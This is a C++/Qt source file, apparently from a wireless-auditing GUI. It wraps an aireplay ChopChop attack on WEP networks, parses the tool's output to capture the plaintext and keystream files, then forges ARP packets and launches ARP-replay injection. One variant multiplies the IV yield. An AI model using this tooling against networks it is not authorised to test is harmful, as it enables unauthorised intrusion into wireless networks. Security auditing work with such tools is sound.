#include "aireplaychopchop.h"
#include "ui_chopchop.h"


aireplayChopChop::aireplayChopChop(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::chopChop)
{

    logThread::addLog("Constructor of chopchop attack GUI", logInfo::MAIN);

    attack = new attackChopChop();
    ui->setupUi(this);
    connect(attack, SIGNAL(processOutput(QString)), this, SLOT(update(QString)));
    connect(this->ui->pushButtonStop, SIGNAL(clicked()), this, SLOT(stop()));
    connect(this->ui->pushButtonLog, SIGNAL(clicked()), this, SLOT(clearLog()));

    this->ui->progressBar->setValue(0);
    this->arpReplay = NULL;

    this->setStatus(STOPPED);
}

aireplayChopChop::~aireplayChopChop()
{
    logThread::addLog("Destructor of chopchop attack GUI", logInfo::MAIN);
    delete ui;
    delete attack;
    if (arpReplay)
        delete arpReplay;
}

void aireplayChopChop::resetValues(){
    this->ui->spinBoxReading->setValue(0);
    this->ui->lineEditSent->clear();
    this->ui->progressBar->setValue(0);
}

void aireplayChopChop::clearLog(){
    utils::customClearLog(this->ui->textEdit, "ChopChop Attack Log");
}

void aireplayChopChop::toThisLog(QString com){
    this->ui->textEdit->append(com);
}


QString aireplayChopChop::getStatusQString()
{
    switch (status) {
        case STOPPED:
            return "STOPPED";
            break;
        case ATTACKING:
            return "ATTACKING";
            break;
        case OBTAINED:
            return "OBTAINED";
            break;
        default:
            return "UNKNOWN";
            break;
    }
}

void aireplayChopChop::setStatus(STATUS s){
    {status = s;}
    switch (s) {
    case STOPPED:
        this->ui->lineEditStatus->setText("STOPPED");
        utils::setBackgroundColor(this->ui->lineEditStatus, utils::RED);
        //progressBar to 0%
        this->ui->progressBar->setValue(0);
        break;
    case ATTACKING:
        this->ui->lineEditStatus->setText("ATTACKING...");
        utils::setBackgroundColor(this->ui->lineEditStatus, utils::YELLOW);
        break;
    case OBTAINED:
        utils::setBackgroundColor(this->ui->lineEditStatus, utils::GREEN);
        this->ui->lineEditStatus->setText("OBTAINED");
        //progressBar to 100%
        this->ui->progressBar->setValue(100);
        break;
    }

    logThread::addLog("ChopChop: Status changes to " + getStatusQString(), logInfo::MAIN);

    emit statusChanged(getStatusQString());

}

void aireplayChopChop::injectPaquet(){

    logThread::addLog("ChopChop: Injecting packet", logInfo::MAIN);

    //If previuos arp is open, we delete
    if (arpReplay)
        delete arpReplay;

    //inserting window arp replay
    arpReplay = new aireplayArpReplay();
    //connect to log
    connect(this->arpReplay, SIGNAL(toLog(QString)), this, SLOT(toThisLog(QString)));
    this->ui->tabWidget->addTab(arpReplay, "Step 2: Inject ARP Forged");
    this->ui->tabWidget->setCurrentWidget(arpReplay);
    arpReplay->showMaximized();



    QString arpForged;
    const QString IP_DEST = utils::findIpDest(lastDecryptedCap);

    //We have a decrypted packet so we CAN find ipdest
    //************************************************************************
    //by this method, we obtain 3 IV per each ARP Paquet reinjected!!!!!!!!!!!!!!!!!!!!!!!
    //************************************************************************
    if (!IP_DEST.isEmpty()) {
        logThread::addLog("ChopChop: Trying with injection x 3", logInfo::MAIN);
        //special arp forged, we could receive 3 ivs per each arp injected
        arpForged = utils::forgeARP(lastXor, lastBSSID, lastMAC, "10.255.255.255", IP_DEST);
        toThisLog("*****************************************************************************");
        toThisLog(utils::htmlVerde("DECRYPTED AN IP_DEST! INJECTION RATE MULTIPLIED X 3!!!!!!!"));
        toThisLog("*****************************************************************************");
        //sent to log arp-replay
        arpReplay->toThisLog("*****************************************************************************");
        arpReplay->toThisLog(utils::htmlVerde("DECRYPTED AN IP_DEST! INJECTION RATE MULTIPLIED X 3!!!!!!!"));
        arpReplay->toThisLog("*****************************************************************************");
    }

    else {
        //normal arp forged
        logThread::addLog("ChopChop: Trying with normal injection", logInfo::MAIN);
        arpForged = utils::forgeARP(lastXor, lastBSSID, lastMAC, "255.255.255.255", "255.255.255.255");
    }

    if (arpForged.isEmpty()) {
        toThisLog(utils::htmlRojo("arpForged Error File"));
        return;
    }


    toThisLog(utils::htmlVerde(QString("arpForged and stored in " + arpForged)));

    //start injecting
    arpReplay->start(lastBSSID, lastMAC, arpForged);
    toThisLog(utils::htmlVerde("INJECTING!!"));
    emit succesfull("CHOPCHOP ATTACK SUCCESFULL! RE-INYECTING!");

}

bool aireplayChopChop::start(QString BSSID, QString MAC){

    logThread::addLog(QString("ChopChop: Starting attack with BSSID=%1, MAC=%2").arg(BSSID).arg(MAC), logInfo::MAIN);

    //checking if the folder BSSID exists. If not, we create it to store there caps
    if (!QFile::exists(CHOP_FOLDER + BSSID))
        QDir::current().mkdir(CHOP_FOLDER + BSSID);

    //set working directory
    attack->getProcess()->setWorkingDirectory(CHOP_FOLDER + BSSID);

    const bool ok = attack->start(BSSID, MAC);

    if (ok) {
        //storing BSSID & MAC
        this->lastBSSID = BSSID;
        this->lastMAC = MAC;
        this->setStatus(ATTACKING);
    }

    return ok;

}


void aireplayChopChop::stop(){
    logThread::addLog("ChopChop: Stopping", logInfo::MAIN);

    if (attack->isRunning()) {
        attack->stop();
        toThisLog("Process stopped");
    }

    //stopping arpreplay step 2 also
    if (arpReplay)
        if (arpReplay->getStatus() != aireplayArpReplay::STOPPED)
            arpReplay->stop();

    this->setStatus(STOPPED);
}

void aireplayChopChop::update(QString info){

    info.remove("\n");
    info.remove("\r");

    if (!info.isEmpty()) {
        //Reading packets
        if (info.contains("Read"))
            this->ui->spinBoxReading->setValue(utils::dropNumber(info));

        //Sent packets
        else if (info.contains("Sent"))
            //only to lineEdit
            this->ui->lineEditSent->setText(info);

        //arrive a packet
        else if (info.contains("Size: ")) {
            toThisLog(utils::htmlVerde("We found a packet!!!"));
            toThisLog(info);
        }

        //Errors. Is necessary to change the status to stopped
        else if (info.contains("Failure:") || info.contains("failed")) {
            this->toThisLog(utils::htmlRojo(info));
            this->setStatus(STOPPED);
        }

        //Normal errors
        else if (info.contains("deauthentication") || info.contains("FAILED") ||
                 info.contains("invalid"))
            toThisLog(utils::htmlRojo(info));

        //Normal succesfull in getting X offset
        else if (info.contains("frames written")) {
            toThisLog(utils::htmlVerde(info));
            //update progressBar
            int index = info.indexOf('(') + 1;
            QString number;
            while (index < info.size() && info.at(index) != '%')
                number += info.at(index++);
            this->ui->progressBar->setValue(number.toInt());
        }


        //Saving decrypted packet (we can look it to found IP's of clients)
        else if (info.contains("Saving plaintext")){
            toThisLog(utils::htmlVerde(info));
            //getting decrypted cap file
            lastDecryptedCap = CHOP_FOLDER + lastBSSID + "/" + info.split(' ').at(3);
            //absolute path
            lastDecryptedCap = QFileInfo(lastDecryptedCap).absoluteFilePath();
            logThread::addLog("ChopChop: Saving plaintext to " + lastDecryptedCap, logInfo::MAIN);

        }

        //Saving keystream
        else if (info.contains("Saving keystream")){
            toThisLog(utils::htmlVerde(info));
            //getting xor file
            lastXor = CHOP_FOLDER + lastBSSID + "/" + info.split(' ').at(3);
            //absolute path
            lastXor = QFileInfo(lastXor).absoluteFilePath();
            logThread::addLog("ChopChop: Saving keystream to " + lastXor, logInfo::MAIN);
        }

        //ChopChop Completed succesfully
        else if (info.contains("Completed")){
            toThisLog(utils::htmlVerde(info));
            toThisLog(utils::htmlVerde("Building and preparing arp request to be injected..."));
            this->setStatus(OBTAINED);
            logThread::addLog("ChopChop: ATTACK SUCCESFULL. Injecting in 1 second", logInfo::MAIN);
            //LAUNCH INJECT!
            QTimer::singleShot(1000, this, SLOT(injectPaquet()));
        }

        else
            toThisLog(info);
    }
}
